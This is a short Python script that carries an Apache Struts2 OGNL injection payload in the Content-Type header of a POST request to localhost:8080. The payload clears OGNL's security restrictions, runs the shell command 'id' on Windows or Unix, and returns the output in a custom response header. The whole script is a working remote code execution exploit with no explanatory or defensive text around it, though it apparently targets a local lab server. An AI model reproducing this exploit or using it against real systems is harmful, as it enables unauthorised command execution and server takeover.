import requests

ognl = """%{(#_='multipart/form-data').
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).
(#cmd='id').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).
(#p=new java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).
(#process=#p.start()).
(#reader=new java.util.Scanner(#process.getInputStream()).useDelimiter('\\\\A')).
(#d=#reader.hasNext()?#reader.next().replaceAll('\\n',' | '):'').
(#response=@org.apache.struts2.ServletActionContext@getResponse()).
(#response.addHeader('X-Cmd-Output', #d))}"""

headers = {"Content-Type": ognl.replace("\n", ""), "User-Agent": "Mozilla/5.0"}
try:
    r = requests.post("http://localhost:8080/", headers=headers, timeout=5)
    print(r.status_code)
    print("OUTPUT:", r.headers.get("X-Cmd-Output"))
except Exception as e:
    print(e)
